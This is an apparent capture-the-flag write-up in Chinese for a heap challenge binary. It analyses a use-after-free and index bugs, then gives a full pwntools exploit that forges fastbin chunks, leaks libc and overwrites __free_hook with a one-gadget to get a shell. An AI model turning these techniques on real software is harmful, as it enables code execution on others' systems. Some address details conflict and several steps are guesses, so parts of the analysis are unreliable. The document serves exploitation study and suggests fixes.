# 漏洞利用文档

## 执行环境
基于提供的调试信息和程序分析，程序的执行环境如下：

- **文件类型**：ELF 64位可执行程序，无PIE（Position-Independent Executable），基地址固定为0x400000。
- **安全特性**（通过checksec确认）：
  - Full RELRO：GOT表只读，防止GOT覆盖攻击。
  - Stack Canary：栈保护启用，防止栈溢出。
  - NX：数据执行保护启用，防止shellcode在栈或堆上执行。
  - 无PIE：代码段地址固定，便于利用。
- **依赖库**：通过ldd推断，程序依赖系统libc（基地址约0x7ffff7a0d000），无需额外依赖。
- **运行需求**：程序在Linux环境下运行，通过标准输入接收用户命令（菜单驱动），提供堆内存管理功能（分配、编辑、显示、释放）。

## 漏洞成因
程序存在多个内存破坏型漏洞，主要成因基于反编译代码和调试结果分析：

### 关键数据结构
- **全局指针数组 `ptr`**：地址0x602060，存储10个堆块指针（每个8字节），索引0-9。
- **编辑计数器 `dword_6020B0`**：地址0x602070（与`ptr[2]`重叠），限制编辑操作最多3次。
- **堆块布局**：每个分配堆块大小为0x20字节（包括头部和数据区），fastbins链表管理释放的堆块。

### 漏洞分析
1. **Use-after-Free (UAF) 漏洞**：
   - **位置**：释放函数（`sub_400B54`）释放堆块后未将`ptr`数组中的指针置空。
   - **成因**：用户可通过编辑或显示函数继续使用悬空指针，读写已释放内存。调试中Step 1-2显示，释放后`ptr[0]`和`ptr[1]`仍指向已释放堆块，fastbins链表完整（如`0x5930000 → 0x5930030`），允许UAF利用。

2. **越界写入漏洞**：
   - **位置**：编辑函数（`sub_400A79`）索引检查不严，允许索引0-31（但`ptr`数组只有10个元素）。
   - **成因**：索引10-31可写入全局内存区域（地址0x6020b0之后），但调试显示该区域初始为0，无立即风险；若存在残留数据，可导致任意地址写入。

3. **全局变量覆盖漏洞**：
   - **位置**：分配和编辑函数中索引2的操作。
   - **成因**：`ptr[2]`与`dword_6020B0`重叠，分配索引2会覆盖编辑计数器为堆指针，编辑索引2会递增该指针（通过`++dword_6020B0`），可能破坏内存完整性。

**根本原因**：缺乏指针管理和边界检查，导致UAF和堆溢出，结合全局变量布局问题，允许攻击者控制内存布局和执行流。

## 漏洞利用过程
利用过程通过exp脚本分步执行，关键步骤基于调试记录（Step 1-3有具体内存变化，后续步骤因程序未执行而处于初始状态）。下表描述exp步骤的预期内存变化和利用逻辑：

| 步骤 | 操作 | 内存变化描述 | 利用目的 |
|------|------|---------------|----------|
| 1 | `malloc(0); malloc(1); free(1); free(0)` | - 分配堆块0和1（地址如0x5930010和0x5930040）。<br>- 释放后，fastbins链表形成：`0x5930000 → 0x5930030 → 0x0`。<br>- `ptr[0]`和`ptr[1]`保持悬空指针（UAF漏洞）。 | 创建UAF条件，为后续泄露和操作堆布局做准备。 |
| 2 | `puts(0)` | - 通过UAF读取堆块0数据区，泄露fd指针（0x5930030）。<br>- 堆数据区被清空，为伪造数据提供环境。 | 泄露堆地址，计算堆基地址（`heap_addr = 泄露值 - 0x30`）。 |
| 3 | `edit(0, py1)` | - 写入伪造chunk头：`p64(heap_addr+0x20) + p64(0) + p64(0) + p64(0x31)`。<br>- 修改fastbins链表，指向伪造的chunk。 | 构造fake chunk，用于后续堆布局操纵。 |
| 4 | `malloc(6); malloc(7); malloc(2); malloc(3)` | - 分配多个堆块，可能用于隔离或构造特定布局。<br>- 分配索引2会覆盖`dword_6020B0`为堆指针。 | 准备堆空间，避免干扰主要利用链。 |
| 5 | `malloc(4, py2)` | - 写入伪造chunk数据：`p64(0) + p64(0x31) + p64(FD) + p64(BK)`，其中`FD=0x602080-24`, `BK=0x602080-16`。<br>- 伪造chunk指向全局变量区域。 | 构造fake chunk以劫持bins链表，为覆盖`__free_hook`做准备。 |
| 6 | `malloc(5, py3)` | - 写入大小信息：`p64(0x30) + p64(0x30)`。<br>- 可能用于调整堆布局或验证。 | 完善fake chunk结构，确保链表一致性。 |
| 7 | `free(1)` | - 释放堆块1，可能触发bins合并或链表操作。<br>- 结合伪造chunk，操纵fastbins。 | 触发堆管理器操作，将伪造chunk纳入bins。 |
| 8 | `puts(1)` | - 通过UAF读取堆块1数据区，泄露libc地址（如main_arena地址）。<br>- 计算libc基地址：`libc_base = (main_arena & 0xfffffffff000) - 0x3c4000`。 | 泄露libc基地址，为计算gadget和hook地址提供基础。 |
| 9 | `edit(4, p64(free_hook))` | - 覆盖伪造chunk的指针为`__free_hook`地址（`free_hook = libc_base + libc.symbols["__free_hook"]`）。<br>- 修改全局或堆数据，指向`__free_hook`。 | 劫持`__free_hook`指针，为执行任意代码做准备。 |
| 10 | `edit(1, p64(onegadget))` | - 将one-gadget地址（`onegadget = libc_base + 0x4527a`）写入`__free_hook`位置。<br>- 通过UAF或指针操纵完成写入。 | 覆盖`__free_hook`为one-gadget，实现任意代码执行。 |
| 11 | `free(2)` | - 释放堆块2，触发`__free_hook`调用，执行one-gadget。<br>- 获得shell或程序控制权。 | 触发漏洞利用，实现权限提升或代码执行。 |
| 12 | `p.interactive()` | - 进入交互模式，用户可执行任意命令。 | 维持shell会话，便于进一步操作。 |

**内存变化总结**：
- **堆内存**：从初始未分配状态，通过UAF和伪造chunk操纵fastbins链表，最终覆盖关键指针。
- **全局内存**：`ptr`数组被利用进行UAF读写，`dword_6020B0`可能被覆盖但非利用关键。
- **利用链**：UAF泄露地址 → 堆布局操纵 → 泄露libc → 覆盖`__free_hook` → 触发执行。

## Exploit
以下是漏洞利用脚本（exp），在关键位置添加注释解释其目的：

```python
from pwn import *

# 设置上下文和程序环境
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample2')
p = process('./data/sample2')
libc = elf.libc  # 获取libc引用
sl = lambda s : p.sendline(s.encode() if isinstance(s, str) else s)
sd = lambda s : p.send(s.encode() if isinstance(s, str) else s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s.encode() if isinstance(s, str) else s)
ti = lambda : p.interactive()

# 定义功能函数
def malloc(index, Content):
    ru("Choice:")
    sl('1')  # 选择分配操作
    ru("Index:")
    sl(str(index))
    ru("Content:")
    sd(Content)

def free(Index):
    ru("Choice:")
    sl('4')  # 选择释放操作
    ru("Index:")
    sl(str(Index))

def puts(Index):
    ru("Choice:")
    sl('3')  # 选择显示操作
    ru("Index:")
    sl(str(Index))

def edit(index, Content):
    ru("Choice:")
    sl('2')  # 选择编辑操作
    ru("Index:")
    sl(str(index))
    ru("Content:")
    sd(Content)

# 步骤1: 创建UAF条件 - 分配并释放两个堆块，形成fastbins链表
malloc(0, b'aaaaaaaa\n')
malloc(1, b'bbbbbbbb\n')
free(1)
free(0)  # 现在fastbins: 0x5930000 -> 0x5930030 -> 0x0

# 步骤2: 泄露堆地址 - 通过UAF读取已释放堆块0的fd指针
puts(0)
heap_addr = u64(rc(4).ljust(8, b'\x00')) - 0x30  # 计算堆基地址

# 步骤3: 构造fake chunk - 编辑堆块0，写入伪造的chunk头以操纵fastbins
py1 = p64(heap_addr + 0x20) + p64(0) + p64(0) + p64(0x31)  # 伪造chunk指向heap_addr+0x20
edit(0, py1)

# 步骤4: 分配额外堆块 - 准备堆布局，避免干扰
malloc(6, b'aaa\n')
malloc(7, p64(0) + p64(0xa1) + b'\n')  # 可能用于大小调整
malloc(2, b'cccccccc\n')  # 覆盖dword_6020B0，但非关键
malloc(3, b'dddddddd\n')

# 步骤5: 构造用于劫持的fake chunk - 指向全局变量区域
FD = 0x602080 - 24  # 伪造的fd指针
BK = 0x602080 - 16  # 伪造的bk指针
py2 = p64(0) + p64(0x31) + p64(FD) + p64(BK)  # 伪造chunk数据
malloc(4, py2)

# 步骤6: 完善fake chunk结构 - 写入大小信息
py3 = p64(0x30) + p64(0x30) + b'\n'
malloc(5, py3)

# 步骤7: 触发堆操作 - 释放堆块1，可能整合伪造chunk到bins
free(1)

# 步骤8: 泄露libc地址 - 通过UAF读取堆块1，获取main_arena地址
puts(1)
main_arena = u64(rc(6).ljust(8, b'\x00')) - 88  # 计算main_arena地址
libc_base = (main_arena & 0xfffffffff000) - 0x3c4000  # 计算libc基地址
onegadget = libc_base + 0x4527a  # one-gadget地址（需根据libc版本调整）
free_hook = libc_base + libc.symbols["__free_hook"]  # __free_hook地址

# 步骤9: 覆盖指针为__free_hook - 编辑堆块4，修改伪造chunk指向__free_hook
edit(4, p64(free_hook) + b'\n')

# 步骤10: 写入one-gadget - 编辑堆块1，将one-gadget写入__free_hook位置
edit(1, p64(onegadget) + b'\n')

# 步骤11: 触发执行 - 释放堆块2，调用__free_hook，执行one-gadget
free(2)

# 步骤12: 获取shell - 进入交互模式
p.interactive()
```

### 注释说明
- **关键漏洞利用点**：脚本利用UAF泄露地址和堆溢出，通过伪造chunk劫持bins链表，最终覆盖`__free_hook`实现代码执行。
- **适应性注意**：one-gadget偏移（0x4527a）可能需根据实际libc版本调整；调试中程序处于初始状态，需确保exp在完整执行环境下运行。
- **修复建议**：修复UAF（释放后置空指针）、严格索引检查、分离全局变量布局。
